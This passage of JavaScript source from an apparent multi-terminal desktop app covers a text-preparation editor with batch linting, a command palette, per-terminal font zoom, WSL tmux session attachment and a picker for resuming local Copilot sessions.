    issues.push({ line: lines.length, column: Math.max(1, lines.at(-1).length), code: "CMD003", severity: "error", message: `${parentheses} opening parenthesis${parentheses === 1 ? " is" : "es are"} not closed.` });
  }
  for (const reference of references) {
    if (!labels.has(reference.name.toLocaleLowerCase())) {
      issues.push({ ...reference, code: "CMD004", severity: "warning", message: `Label '${reference.name}' is not defined.` });
    }
  }
  return { engine: "Batch structural lint", issues };
}

async function validatePreparedText() {
  if (state.prepareEditor.validating) return;
  const language = elements.prepareLanguage.value;
  const text = elements.prepareText.value;
  if (language === "batch") {
    renderPrepareIssues(lintBatchText(text));
    return;
  }
  if (language === "text") {
    renderPrepareIssues({ engine: "Plain text", issues: [] });
    return;
  }
  if (!state.socketReady) {
    renderPrepareIssues({ engine: "syntax check", issues: [], error: "Bridge unavailable" });
    return;
  }
  state.prepareEditor.validating = true;
  elements.prepareValidate.disabled = true;
  setPrepareValidation("Checking\u2026");
  const result = await requestBridge({ type: "prepareValidate", language, text }, { timeout: 60000 });
  state.prepareEditor.validating = false;
  elements.prepareValidate.disabled = false;
  renderPrepareIssues(result || { engine: "syntax check", issues: [], error: "Syntax checker did not respond" });
}

async function copyPreparedText() {
  try {
    await writeClipboardText(elements.prepareText.value);
    toast("Prepared text copied", "success", 1800);
  } catch {
    toast("Clipboard unavailable", "error");
  }
}

async function runPreparePrimaryAction() {
  if (state.prepareEditor.mode !== "paste") {
    await copyPreparedText();
    return;
  }
  const terminal = state.terminals.get(state.prepareEditor.sourceTerminalId);
  if (!terminal || terminal.status !== "live") {
    toast("The focused terminal is no longer available", "error", 2200);
    return;
  }
  if (!sendPreparedTextToTerminal(terminal.id)) return;
  closePrepareEditor({ restoreFocus: false });
  window.requestAnimationFrame(() => terminal.term.focus());
}

async function openPrepareAndPaste(terminal) {
  if (!terminal || !state.terminals.has(terminal.id)) return;
  try {
    const text = normalizeClipboardText(await readClipboardText());
    if (!text) {
      toast("Clipboard has no text to prepare", "info", 1800);
      return;
    }
    openPrepareEditor(text, terminal.id, "paste");
  } catch {
    toast("Clipboard unavailable", "error");
  }
}

function savePreparedSnippet() {
  const text = elements.prepareText.value;
  if (/\r|\n/.test(text)) {
    toast("Snippets are single commands. Save multi-line text as a script instead.", "info", 3200);
    return;
  }
  addSnippet(elements.prepareSnippetName.value, text);
  elements.prepareSnippetName.value = "";
}

async function savePreparedFile() {
  const response = await requestBridge({
    type: "prepareSave",
    text: elements.prepareText.value,
    suggestedName: elements.prepareFileName.value,
    cwd: state.terminals.get(state.prepareEditor.sourceTerminalId)?.cwd || elements.cwdInput.value || ""
  });
  if (response?.path) {
    elements.prepareFileName.value = response.path.split(/[\\/]/).pop();
    toast(`Saved ${elements.prepareFileName.value}`, "success", 2200);
  } else if (response?.error) {
    toast(response.error, "error", 3200);
  }
}

function renderPrepareTerminalFlyout() {
  const terminals = [...state.terminals.values()].filter((terminal) => terminal.status === "live");
  elements.prepareTerminalList.textContent = "";
  const createButton = document.createElement("button");
  createButton.type = "button";
  createButton.role = "menuitem";
  createButton.className = "prepare-terminal-new";
  const createName = document.createElement("span");
  createName.textContent = "New terminal";
  const createMeta = document.createElement("span");
  createMeta.className = "prepare-terminal-meta";
  createMeta.textContent = pageName(state.activePageId) || "Current page";
  createButton.append(createName, createMeta);
  createButton.addEventListener("click", sendPreparedTextToNewTerminal);
  elements.prepareTerminalList.append(createButton);
  if (terminals.length === 0) {
    const empty = document.createElement("p");
    empty.className = "prepare-terminal-empty";
    empty.textContent = "No other live terminals";
    elements.prepareTerminalList.append(empty);
    return;
  }
  for (const terminal of terminals) {
    const button = document.createElement("button");
    button.type = "button";
    button.role = "menuitem";
    const name = document.createElement("span");
    name.textContent = terminal.titleInput.value || "Terminal";
    const meta = document.createElement("span");
    meta.className = "prepare-terminal-meta";
    meta.textContent = terminal.pid ? `PID ${terminal.pid}` : "starting";
    button.append(name, meta);
    button.addEventListener("click", () => sendPreparedTextToTerminal(terminal.id));
    elements.prepareTerminalList.append(button);
  }
}

function togglePrepareTerminalFlyout(force) {
  const open = force === undefined ? elements.prepareTerminalFlyout.hidden : Boolean(force);
  if (open) renderPrepareTerminalFlyout();
  elements.prepareTerminalFlyout.hidden = !open;
  elements.prepareSend.setAttribute("aria-expanded", String(open));
  if (open) elements.prepareTerminalList.querySelector("button")?.focus();
}

function navigatePrepareTerminalFlyout(event) {
  const keys = new Set(["ArrowDown", "ArrowUp", "End", "Home", "PageDown", "PageUp"]);
  if (!keys.has(event.key)) return;
  const options = [...elements.prepareTerminalList.querySelectorAll("button:not([disabled])")];
  if (options.length === 0) return;
  event.preventDefault();
  const current = Math.max(0, options.indexOf(document.activeElement));
  let next = current;
  if (event.key === "ArrowDown") next = (current + 1) % options.length;
  else if (event.key === "ArrowUp") next = (current - 1 + options.length) % options.length;
  else if (event.key === "Home") next = 0;
  else if (event.key === "End") next = options.length - 1;
  else if (event.key === "PageDown") next = Math.min(options.length - 1, current + 5);
  else if (event.key === "PageUp") next = Math.max(0, current - 5);
  options[next].focus({ preventScroll: true });
  options[next].scrollIntoView({ block: "nearest" });
}

function sendPreparedTextToTerminal(id) {
  const terminal = state.terminals.get(id);
  if (!terminal || terminal.status !== "live") {
    toast("That terminal is no longer available", "error", 2200);
    renderPrepareTerminalFlyout();
    return false;
  }
  const text = elements.prepareText.value;
  if (!text) {
    toast("There is no text to send", "info", 1600);
    return false;
  }
  terminal.term.paste(text);
  togglePrepareTerminalFlyout(false);
  toast(`Inserted in ${terminal.titleInput.value || "Terminal"} without Enter`, "success", 2200);
  return true;
}

function sendPreparedTextToNewTerminal() {
  const text = elements.prepareText.value;
  if (!text) {
    toast("There is no text to send", "info", 1600);
    return false;
  }
  const currentPageId = state.activePageId;
  const terminal = addTerminal({
    reveal: true,
    runStartup: true,
    pageId: currentPageId,
    pendingPaste: text
  });
  togglePrepareTerminalFlyout(false);
  toast(`Opening ${terminal.titleInput.value || "a new terminal"} on ${pageName(currentPageId) || "the current page"}`, "success", 2200);
  return true;
}

function bindPrepareEditor() {
  if (!elements.prepareOverlay) return;
  elements.prepareClose.addEventListener("click", () => closePrepareEditor());
  elements.prepareOverlay.addEventListener("pointerdown", (event) => {
    if (event.target === elements.prepareOverlay) closePrepareEditor();
    if (!event.target.closest(".prepare-send-wrap")) togglePrepareTerminalFlyout(false);
  });
  elements.prepareText.addEventListener("input", preparedTextChanged);
  elements.prepareText.addEventListener("scroll", () => {
    elements.prepareLineNumbers.scrollTop = elements.prepareText.scrollTop;
  });
  elements.prepareText.addEventListener("click", updatePrepareStatus);
  elements.prepareText.addEventListener("keyup", updatePrepareStatus);
  elements.prepareText.addEventListener("keydown", (event) => {
    if (event.key === "Tab") {
      event.preventDefault();
      indentPreparedText(event.shiftKey);
    } else if (event.ctrlKey && !event.shiftKey && event.key.toLowerCase() === "f") {
      event.preventDefault();
      togglePrepareFind(true);
    } else if (event.ctrlKey && !event.shiftKey && event.key.toLowerCase() === "s") {
      event.preventDefault();
      savePreparedFile();
    }
  });
  elements.prepareLanguage.addEventListener("change", () => {
    if (Object.values(PREPARE_FILE_NAMES).includes(elements.prepareFileName.value)) {
      elements.prepareFileName.value = PREPARE_FILE_NAMES[elements.prepareLanguage.value];
    }
    preparedTextChanged();
  });
  elements.prepareUndo.addEventListener("click", () => { elements.prepareText.focus(); document.execCommand("undo"); preparedTextChanged(); });
  elements.prepareRedo.addEventListener("click", () => { elements.prepareText.focus(); document.execCommand("redo"); preparedTextChanged(); });
  elements.prepareFindToggle.addEventListener("click", () => togglePrepareFind());
  elements.prepareWrap.addEventListener("click", () => setPrepareWordWrap(!state.prepareEditor.wordWrap));
  elements.prepareCleanCopilot.addEventListener("click", cleanPreparedCopilotBorders);
  elements.prepareFind.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
      event.preventDefault();
      findPreparedText(event.shiftKey ? -1 : 1);
    } else if (event.key === "Escape") {
      event.preventDefault();
      togglePrepareFind(false);
    }
  });
  elements.prepareFindPrevious.addEventListener("click", () => findPreparedText(-1));
  elements.prepareFindNext.addEventListener("click", () => findPreparedText(1));
  elements.prepareReplaceOne.addEventListener("click", replacePreparedText);
  elements.prepareReplaceAll.addEventListener("click", replaceAllPreparedText);
  elements.prepareValidate.addEventListener("click", validatePreparedText);
  elements.prepareCopy.addEventListener("click", runPreparePrimaryAction);
  elements.prepareSaveSnippet.addEventListener("click", savePreparedSnippet);
  elements.prepareSaveFile.addEventListener("click", savePreparedFile);
  elements.prepareSend.addEventListener("click", () => togglePrepareTerminalFlyout());
  elements.prepareTerminalList.addEventListener("keydown", navigatePrepareTerminalFlyout);
  state.prepareEditor.resizeObserver = createPrepareResizeObserver();
  elements.prepareOverlay.addEventListener("keydown", (event) => {
    if (event.key === "Escape") {
      event.preventDefault();
      event.stopPropagation();
      if (!elements.prepareTerminalFlyout.hidden) togglePrepareTerminalFlyout(false);
      else if (!elements.prepareFindBar.hidden) togglePrepareFind(false);
      else closePrepareEditor();
      return;
    }
    if (event.key !== "Tab" || event.target === elements.prepareText) return;
    const focusable = prepareEditorFocusableElements();
    if (focusable.length === 0) return;
    const first = focusable[0];
    const last = focusable[focusable.length - 1];
    if (event.shiftKey && document.activeElement === first) {
      event.preventDefault();
      last.focus();
    } else if (!event.shiftKey && document.activeElement === last) {
      event.preventDefault();
      first.focus();
    }
  });
}

function copyActiveTerminal() {
  if (state.activeId) copyTerminalOutput(state.activeId);
}

function cycleTerminal(direction) {
  // Cycling stays on the page you are looking at; Alt+Q crosses pages.
  const ids = terminalsOnActivePage().map((terminal) => terminal.id);
  if (ids.length === 0) return;
  const current = ids.indexOf(state.activeId);
  const next = ids[(current + direction + ids.length) % ids.length];
  setActiveTerminalAndReveal(next);
}

function setActiveTerminalAndReveal(id) {
  const terminal = state.terminals.get(id);
  if (!terminal) return;
  // Focusing a terminal that lives on another page brings that page forward
  // first, otherwise the pane is display:none and cannot be scrolled to.
  if (!isOnActivePage(terminal)) {
    setActivePage(terminal.pageId, { focus: false });
  }
  setActiveTerminal(id);
  revealTerminal(terminal);
  terminal.term.focus();
}

function setLayoutMode(value) {
  clearSnapLayout(false);
  state.settings.layout = value;
  elements.layoutMode.value = value;
  applySettings();
  saveSettings();
}

function fontZoom(delta) {
  const next = Math.min(MAX_FONT_SIZE, Math.max(MIN_FONT_SIZE, state.settings.fontSize + delta));
  if (next === state.settings.fontSize) return;
  state.settings.fontSize = next;
  elements.fontSize.value = next;
  applySettings();
  saveSettings();
}

function resetFontZoom() {
  const next = Math.min(MAX_FONT_SIZE, Math.max(MIN_FONT_SIZE, defaultSettings.fontSize));
  state.settings.fontSize = next;
  elements.fontSize.value = next;
  applySettings();
  saveSettings();
}

function terminalFontSize(terminal) {
  return terminal.fontSizeOverride ?? state.settings.fontSize;
}

function showTerminalFontZoom(terminal, size, isDefault) {
  window.clearTimeout(terminal.fontZoomIndicatorTimer);
  terminal.fontZoomIndicator.textContent = isDefault ? `${size}px · default` : `${size}px`;
  terminal.fontZoomIndicator.classList.add("is-visible");
  terminal.fontZoomIndicatorTimer = window.setTimeout(() => {
    terminal.fontZoomIndicator.classList.remove("is-visible");
    terminal.fontZoomIndicatorTimer = 0;
  }, 1100);
}

function setTerminalFontSize(terminal, requestedSize) {
  if (!terminal) return;
  const size = Math.min(MAX_FONT_SIZE, Math.max(MIN_FONT_SIZE, Math.round(requestedSize)));
  terminal.fontSizeOverride = size === state.settings.fontSize ? null : size;
  terminal.term.options.fontSize = size;
  scheduleFit(terminal);
  saveSessionSnapshot();
  showTerminalFontZoom(terminal, size, terminal.fontSizeOverride == null);
}

function zoomTerminalFont(id, delta) {
  const terminal = state.terminals.get(id);
  if (!terminal) return;
  setTerminalFontSize(terminal, terminalFontSize(terminal) + delta);
}

function resetTerminalFontZoom(id) {
  const terminal = state.terminals.get(id);
  if (!terminal) return;
  terminal.fontSizeOverride = null;
  terminal.term.options.fontSize = state.settings.fontSize;
  scheduleFit(terminal);
  saveSessionSnapshot();
  showTerminalFontZoom(terminal, state.settings.fontSize, true);
}

function zoomActiveTerminalFont(delta) {
  if (state.activeId) zoomTerminalFont(state.activeId, delta);
}

function resetActiveTerminalFontZoom() {
  if (state.activeId) resetTerminalFontZoom(state.activeId);
}

/* ---------------- Command palette --------------- */

function getCommands() {
  const commands = [
    { label: "Toggle fullscreen", hint: "F11", run: toggleFullscreenFocus },
    { label: "New terminal", hint: "Ctrl+T", run: () => addTerminal({ reveal: true, runStartup: true }) },
    { label: "New PowerShell 7 terminal", run: () => addTerminal({ reveal: true, runStartup: true, shell: "pwsh" }) },
    { label: "New Windows PowerShell terminal", run: () => addTerminal({ reveal: true, runStartup: true, shell: "powershell" }) },
    { label: "New Command Prompt terminal", run: () => addTerminal({ reveal: true, runStartup: true, shell: "cmd" }) },
    { label: "New WSL terminal", run: () => addTerminal({ reveal: true, runStartup: true, shell: "wsl" }) },
    { label: "Attach WSL tmux session…", run: openTmuxAttach },
    { label: "New Administrator terminal", run: () => newAdminTerminal() },
    { label: "Restart as Administrator", run: restartAsAdmin },
    { label: "Close active terminal", hint: "Ctrl+Shift+W", run: () => state.activeId && removeTerminal(state.activeId) },
    { label: "Minimize active terminal", run: () => state.activeId && minimizeTerminal(state.activeId) },
    { label: "Restore all minimized terminals", run: restoreAllTerminals },
    { label: "Close all terminals", run: closeAllTerminals },
    { label: "Restart active terminal", hint: "Ctrl+Shift+R", run: restartActiveSession },
    { label: "Find in active terminal", hint: "Ctrl+F", run: openFindActive },
    { label: "Find in all terminals", hint: "Ctrl+Shift+F", run: openFindAll },
    { label: "Clear active terminal", hint: "Ctrl+Shift+L", run: clearActiveTerminal },
    { label: "Copy active output", hint: "Ctrl+Shift+C", run: copyActiveTerminal },
    { label: "Cycle active terminal color", run: () => state.activeId && cyclePaneColor(state.terminals.get(state.activeId)) },
    { label: "Zoom in active terminal", hint: "Ctrl+Alt++", run: () => zoomActiveTerminalFont(1) },
    { label: "Zoom out active terminal", hint: "Ctrl+Alt+-", run: () => zoomActiveTerminalFont(-1) },
    { label: "Reset active terminal zoom", hint: "Ctrl+Alt+0", run: resetActiveTerminalFontZoom },
    { label: "Fit all terminals", run: fitAllTerminals },
    { label: "Reset layout", run: resetLayout },
    { label: "Broadcast command…", hint: "Ctrl+Shift+B", run: () => toggleBroadcast(true) },
    { label: "Dequeue next command", hint: "Ctrl+Shift+Q", run: () => dequeueNextTerminalCommand(state.activeId ? state.terminals.get(state.activeId) : null) },
    { label: "Terminal notes & command queue…", run: () => openTerminalArtifacts(state.activeId) },
    { label: "Send to terminal…", run: () => openTerminalMessages(state.activeId) },
    { label: "Automations…", run: () => openAutomationStudio() },
    { label: "Automation activity…", run: () => openAutomationStudio("activity") },
    { label: "Paste into active terminal", hint: "Ctrl+Shift+V", run: pasteIntoActive },
    { label: "Maximize / restore active pane", hint: "Ctrl+Shift+X", run: () => toggleZoomPane(state.activeId) },
    { label: "Browse & run script in active terminal\u2026", run: () => browseAndRunScript(state.activeId) },
    { label: "Open active terminal folder", run: () => state.activeId && revealTerminalCwd(state.terminals.get(state.activeId)) },
    { label: "New terminal in active folder", run: () => { const active = state.activeId && state.terminals.get(state.activeId); if (active) addTerminal({ reveal: true, runStartup: true, cwd: active.cwd, title: active.titleInput.value }); } },
    { label: "Toggle logging for active terminal", run: () => state.activeId && toggleLogging(state.terminals.get(state.activeId)) },
    { label: "Cycle broadcast scope", run: () => { toggleBroadcastScope(); toast(`Broadcast: ${broadcastScopeLabel()}`, "info", 1600); } },
    { label: "Next terminal", run: () => cycleTerminal(1) },
    { label: "Previous terminal", run: () => cycleTerminal(-1) },
    { label: "Switch terminal\u2026", hint: "Alt+Q", run: openQuickSwitch },
    { label: "New page", hint: "Ctrl+P", run: () => addPage() },
    { label: "Next page", hint: "Ctrl+PageDown", run: () => cyclePage(1) },
    { label: "Previous page", hint: "Ctrl+PageUp", run: () => cyclePage(-1) },
    { label: "Close current page", run: () => requestPageClose(state.activePageId) },
    { label: "Increase default terminal font size", hint: "Ctrl++", run: () => fontZoom(1) },
    { label: "Decrease default terminal font size", hint: "Ctrl+-", run: () => fontZoom(-1) },
    { label: "Toggle app theme", run: toggleAppTheme },
    { label: "Toggle header", run: () => toggleChrome("headerHidden") },
    { label: "Toggle layout panel", run: () => toggleChrome("sidecarHidden") },
    { label: "Keyboard shortcuts", hint: "Ctrl+/", run: openShortcuts },
    { label: "Help", run: openHelp },
    { label: "Check for updates\u2026", run: () => checkForUpdates({ manual: true }) },
    { label: "About MultiTerm", run: openAbout },
    {
      label: `Toggle sync input (${state.settings.syncInput ? "on" : "off"})`,
      run: () => {
        elements.syncInput.checked = !elements.syncInput.checked;
        elements.syncInput.dispatchEvent(new Event("change"));
        toast(`Sync input ${elements.syncInput.checked ? "on" : "off"}`, "info", 1600);
      }
    }
  ];

  const layouts = [
    ["Auto fit", "auto"],
    ["Fixed columns", "columns"],
    ["Fixed rows", "rows"],
    ["Horizontal strip", "horizontal"],
    ["Vertical stack", "vertical"],
    ["Focus rail", "focus"],
    ["Balanced grid", "grid"],
    ["Master top", "master-top"],
    ["Master right", "master-right"],
    ["Master bottom", "master-bottom"],
    ["Master left", "master-left"],
    ["Priority grid", "priority-grid"],
    ["Compact matrix", "compact-matrix"],
    ["Horizontal carousel", "carousel-horizontal"],
    ["Vertical carousel", "carousel-vertical"],
    ["Spotlight", "spotlight"],
    ["Bento grid", "bento"],
    ["Manual canvas", "manual"]
  ];
  for (const [label, value] of layouts) {
    commands.push({ label: `Layout: ${label}`, run: () => setLayoutMode(value) });
  }

  for (const snippet of state.settings.snippets || []) {
    commands.push({ label: `Snippet: ${snippet.name || snippet.command}`, run: () => runSnippet(state.activeId, snippet) });
  }

  for (const terminal of state.terminals.values()) {
    const id = terminal.id;
    commands.push({ label: `Focus: ${terminal.titleInput.value}`, run: () => setActiveTerminalAndReveal(id) });
  }

  if (state.pages.length > 1) {
    for (const page of state.pages) {
      if (page.id === state.activePageId) continue;
      const id = page.id;
      commands.push({ label: `Go to page: ${page.name}`, run: () => setActivePage(id) });
    }
  }

  for (const name of Object.keys(state.workspaces).sort((a, b) => a.localeCompare(b))) {
    commands.push({ label: `Restore workspace: ${name}`, run: () => restoreWorkspace(name) });
  }

  return commands;
}

function bindPalette() {
  elements.paletteInput.addEventListener("input", () => renderPalette());
  elements.paletteInput.addEventListener("keydown", (event) => {
    if (event.key === "ArrowDown") {
      event.preventDefault();
      movePaletteSelection(1);
    } else if (event.key === "ArrowUp") {
      event.preventDefault();
      movePaletteSelection(-1);
    } else if (event.key === "Enter") {
      event.preventDefault();
      runPaletteSelection();
    } else if (event.key === "Escape") {
      event.preventDefault();
      closePalette();
    }
  });

  elements.paletteOverlay.addEventListener("pointerdown", (event) => {
    if (event.target === elements.paletteOverlay) closePalette();
  });

  elements.paletteList.addEventListener("click", (event) => {
    const item = event.target.closest(".palette-item");
    if (!item) return;
    palette.index = Number(item.dataset.index);
    runPaletteSelection();
  });
}

function openPalette() {
  palette.open = true;
  palette.index = 0;
  elements.paletteOverlay.hidden = false;
  window.requestAnimationFrame(() => elements.paletteOverlay.classList.add("is-open"));
  elements.paletteInput.value = "";
  renderPalette();
  elements.paletteInput.focus();
}

function closePalette() {
  if (!palette.open) return;
  palette.open = false;
  elements.paletteOverlay.classList.remove("is-open");
  window.setTimeout(() => {
    elements.paletteOverlay.hidden = true;
  }, 150);
  if (state.activeId) {
    state.terminals.get(state.activeId)?.term.focus();
  }
}

function renderPalette() {
  const query = normalizeSearchText(elements.paletteInput.value);
  const all = getCommands();
  palette.items = query ? all.filter((cmd) => normalizeSearchText(cmd.label).includes(query)) : all;
  palette.index = Math.min(palette.index, Math.max(0, palette.items.length - 1));

  elements.paletteList.innerHTML = "";
  if (palette.items.length === 0) {
    const empty = document.createElement("li");
    empty.className = "palette-empty";
    empty.textContent = "No matching commands";
    elements.paletteList.append(empty);
    return;
  }

  palette.items.forEach((cmd, index) => {
    const li = document.createElement("li");
    li.className = "palette-item";
    li.dataset.index = index;
    li.setAttribute("role", "option");
    li.setAttribute("aria-selected", String(index === palette.index));

    const label = document.createElement("span");
    label.textContent = cmd.label;
    li.append(label);

    if (cmd.hint) {
      const hint = document.createElement("span");
      hint.className = "palette-hint";
      hint.textContent = cmd.hint;
      li.append(hint);
    }

    elements.paletteList.append(li);
  });
}

function movePaletteSelection(direction) {
  if (palette.items.length === 0) return;
  palette.index = (palette.index + direction + palette.items.length) % palette.items.length;
  const nodes = elements.paletteList.querySelectorAll(".palette-item");
  nodes.forEach((node, index) => node.setAttribute("aria-selected", String(index === palette.index)));
  nodes[palette.index]?.scrollIntoView({ block: "nearest" });
}

function runPaletteSelection() {
  const command = palette.items[palette.index];
  closePalette();
  if (command) {
    window.setTimeout(() => command.run(), 60);
  }
}

/* ---------------- WSL tmux attachment --------------- */

let tmuxAttachGeneration = 0;
let tmuxAttachCloseTimer = 0;

function openTmuxAttach() {
  closePalette();
  window.clearTimeout(tmuxAttachCloseTimer);
  tmuxAttachCloseTimer = 0;
  elements.tmuxAttachOverlay.hidden = false;
  window.requestAnimationFrame(() => elements.tmuxAttachOverlay.classList.add("is-open"));
  elements.tmuxAttachRefresh.focus();
  refreshTmuxSessions();
}

function closeTmuxAttach() {
  tmuxAttachGeneration += 1;
  window.clearTimeout(tmuxAttachCloseTimer);
  elements.tmuxAttachOverlay.classList.remove("is-open");
  tmuxAttachCloseTimer = window.setTimeout(() => {
    tmuxAttachCloseTimer = 0;
    elements.tmuxAttachOverlay.hidden = true;
  }, 150);
  if (state.activeId) state.terminals.get(state.activeId)?.term.focus();
}

async function refreshTmuxSessions() {
  const generation = ++tmuxAttachGeneration;
  elements.tmuxAttachRefresh.disabled = true;
  elements.tmuxAttachStatus.textContent = "Looking for running tmux sessions…";
  elements.tmuxAttachList.innerHTML = '<div class="tmux-attach-empty">Scanning WSL distributions…</div>';

  const response = await requestBridge({ type: "listTmux" }, { timeout: 20000 });
  if (generation !== tmuxAttachGeneration || elements.tmuxAttachOverlay.hidden) return;

  elements.tmuxAttachRefresh.disabled = false;
  const sessions = Array.isArray(response?.sessions) ? response.sessions : [];
  renderTmuxSessions(sessions);
  if (sessions.length > 0) {
    const distroCount = new Set(sessions.map((entry) => entry.distro)).size;
    elements.tmuxAttachStatus.textContent = `${sessions.length} session${sessions.length === 1 ? "" : "s"} across ${distroCount} WSL distribution${distroCount === 1 ? "" : "s"}`;
  } else {
    elements.tmuxAttachStatus.textContent = response?.message || "The local bridge did not return any tmux sessions.";
  }
  refreshIcons();
}

function renderTmuxSessions(sessions) {
  elements.tmuxAttachList.innerHTML = "";
  if (sessions.length === 0) {
    const empty = document.createElement("div");
    empty.className = "tmux-attach-empty";
    empty.textContent = "No attachable tmux sessions found.";
    elements.tmuxAttachList.append(empty);
    return;
  }

  for (const candidate of sessions) {
    const button = document.createElement("button");
    button.type = "button";
    button.className = "tmux-session-card";
    button.setAttribute("role", "listitem");
    button.setAttribute("aria-label", `Attach ${candidate.session} in ${candidate.distro}`);

    const main = document.createElement("span");
    main.className = "tmux-session-main";
    const title = document.createElement("span");
    title.className = "tmux-session-title";
    title.textContent = candidate.session;
    const meta = document.createElement("span");
    meta.className = "tmux-session-meta";
    const pid = candidate.panePid ? ` · pane PID ${candidate.panePid}` : "";
    const command = candidate.command ? ` · ${candidate.command}` : "";
    meta.textContent = `${candidate.distro} · ${candidate.windows || 0} window${candidate.windows === 1 ? "" : "s"}${pid}${command}`;
    main.append(title, meta);

    const stateLabel = document.createElement("span");
    stateLabel.className = "tmux-session-state";
    stateLabel.textContent = candidate.attached ? "attached elsewhere" : "ready";
    button.append(main, stateLabel);
    button.addEventListener("click", () => attachTmuxSession(candidate));
    elements.tmuxAttachList.append(button);
  }
}

function attachTmuxSession(candidate) {
  if (!candidate || typeof candidate.distro !== "string" || typeof candidate.session !== "string") return null;
  closeTmuxAttach();
  return addTerminal({
    reveal: true,
    runStartup: false,
    shell: "wsl",
    title: `${candidate.session} · ${candidate.distro}`,
    tmux: { distro: candidate.distro, session: candidate.session }
  });
}

/* ---------------- Copilot session resume --------------- */

const COPILOT_SESSION_PAGE_SIZE = 80;
const COPILOT_SESSION_SOURCES = new Set(["cli", "vscode", "visualstudio"]);
const copilotResume = {
  closeTimer: 0,
  generation: 0,
  newTerminal: false,
  sessions: [],
  terminalId: null,
  visibleLimit: COPILOT_SESSION_PAGE_SIZE
};

function openCopilotResume(terminal = null, { newTerminal = !terminal } = {}) {
  copilotResume.terminalId = terminal?.id || null;
  copilotResume.newTerminal = Boolean(newTerminal);
  copilotResume.sessions = [];
  copilotResume.visibleLimit = COPILOT_SESSION_PAGE_SIZE;
  copilotResume.generation += 1;
  window.clearTimeout(copilotResume.closeTimer);
  copilotResume.closeTimer = 0;
  elements.copilotResumeDescription.textContent = copilotResume.newTerminal
    ? "Choose local CLI or editor history to continue in a new MultiTerm terminal."
    : `Choose a local Copilot CLI session to continue in ${terminal?.titleInput.value || "this terminal"}.`;
  elements.copilotResumeSearch.value = "";
  elements.copilotResumeOverlay.hidden = false;
  window.requestAnimationFrame(() => {
    elements.copilotResumeOverlay.classList.add("is-open");
    elements.copilotResumeSearch.focus();
  });
  refreshCopilotSessions();
}

function closeCopilotResume() {
  copilotResume.generation += 1;
  window.clearTimeout(copilotResume.closeTimer);
  elements.copilotResumeOverlay.classList.remove("is-open");
  copilotResume.closeTimer = window.setTimeout(() => {
    copilotResume.closeTimer = 0;
    elements.copilotResumeOverlay.hidden = true;
  }, 150);
  const terminal = state.terminals.get(copilotResume.terminalId);
  if (terminal) terminal.term.focus();
}

function normalizeCopilotSession(candidate) {
  if (!candidate || !COPILOT_RESUME_ID_PATTERN.test(String(candidate.id || ""))) return null;
  const source = COPILOT_SESSION_SOURCES.has(candidate.source) ? candidate.source : "cli";
  const key = String(candidate.key || (source === "cli" ? `cli:${candidate.id}` : ""));
  if (!key || key.length > 256 || /[\x00-\x1f\x7f]/.test(key)) return null;
  return {
    id: String(candidate.id).toLowerCase(),
    key,
    source,
    name: String(candidate.name || "").trim(),
    cwd: String(candidate.cwd || "").trim(),
    repository: String(candidate.repository || "").trim(),
    branch: String(candidate.branch || "").trim(),
    createdAt: String(candidate.createdAt || ""),
    updatedAt: String(candidate.updatedAt || "")
  };
}

async function refreshCopilotSessions() {
  const generation = ++copilotResume.generation;
  elements.copilotResumeRefresh.disabled = true;
  elements.copilotResumeStatus.textContent = "Looking for local Copilot CLI, VS Code, and Visual Studio sessions\u2026";
  elements.copilotResumeList.innerHTML = '<div class="copilot-resume-empty">Reading session metadata\u2026</div>';
  const response = await requestBridge({ type: "listCopilotSessions" }, { timeout: 20000 });
  if (generation !== copilotResume.generation || elements.copilotResumeOverlay.hidden) return;

  elements.copilotResumeRefresh.disabled = false;
  copilotResume.sessions = (Array.isArray(response?.sessions) ? response.sessions : [])
    .map(normalizeCopilotSession)
    .filter(Boolean);
  renderCopilotSessions();
  if (copilotResume.sessions.length === 0) {
    elements.copilotResumeStatus.textContent = response?.message || "The local bridge did not return any Copilot sessions.";
  }
  refreshIcons(elements.copilotResumeOverlay);
}

function copilotSessionTitle(session) {
  if (session.name) return session.name;
  if (session.repository) return session.repository;
  const pathParts = session.cwd.split(/[\\/]/).filter(Boolean);
  return pathParts[pathParts.length - 1] || "Untitled Copilot session";
}

function copilotSourceLabel(source) {
  if (source === "vscode") return "VS Code";
  if (source === "visualstudio") return "Visual Studio";
  return "Copilot CLI";
}

function renderCopilotSessions() {
  const query = normalizeSearchText(elements.copilotResumeSearch.value);
  const queryTokens = query.split(/\s+/).filter(Boolean);
  const filtered = query
    ? copilotResume.sessions.filter((session) => {
      const corpus = normalizeSearchText([
        copilotSourceLabel(session.source), session.name, session.repository, session.branch, session.cwd, session.id
      ].join(" "));
      return queryTokens.every((token) => corpus.includes(token));
    })
    : copilotResume.sessions;
  const shown = filtered.slice(0, copilotResume.visibleLimit);
  elements.copilotResumeList.textContent = "";

  if (filtered.length === 0) {
    const empty = document.createElement("div");
    empty.className = "copilot-resume-empty";
    empty.textContent = copilotResume.sessions.length === 0
      ? "No resumable Copilot sessions found."
      : "No sessions match this search.";
    elements.copilotResumeList.append(empty);
  }

  for (const session of shown) {
    const button = document.createElement("button");
    button.type = "button";
    button.className = "copilot-session-card";
    button.setAttribute("role", "listitem");
    button.setAttribute("aria-label", `Resume ${copilotSessionTitle(session)}`);

    const main = document.createElement("span");
    main.className = "copilot-session-main";
    const title = document.createElement("span");
    title.className = "copilot-session-title";
    title.textContent = copilotSessionTitle(session);
    const context = document.createElement("span");
    context.className = "copilot-session-context";
    const source = document.createElement("span");
    source.className = "copilot-session-source";
    source.textContent = copilotSourceLabel(session.source);
    context.append(source);
    if (session.repository) {
      const repository = document.createElement("span");
      repository.className = "copilot-session-repository";
      repository.textContent = session.repository;
      context.append(repository);
    }
    if (session.branch) {
      const branch = document.createElement("span");
      branch.textContent = session.branch;
      context.append(branch);
    }
    const cwd = document.createElement("span");
    cwd.className = "copilot-session-cwd";
    cwd.textContent = session.cwd || "Working directory unavailable";
    main.append(title, context, cwd);

    const aside = document.createElement("span");
    aside.className = "copilot-session-aside";
    const time = document.createElement("time");
    time.dateTime = session.updatedAt;
    time.textContent = artifactTimeLabel(session.updatedAt) || "Time unavailable";
    const id = document.createElement("code");
    id.textContent = session.id.slice(0, 8);
    aside.append(time, id);
    button.append(main, aside);
    button.addEventListener("click", () => resumeCopilotSession(session));
    elements.copilotResumeList.append(button);
  }

  if (shown.length < filtered.length) {
    const more = document.createElement("button");
    more.type = "button";
    more.className = "secondary-action copilot-resume-more";
    more.textContent = `Load ${Math.min(COPILOT_SESSION_PAGE_SIZE, filtered.length - shown.length)} more`;
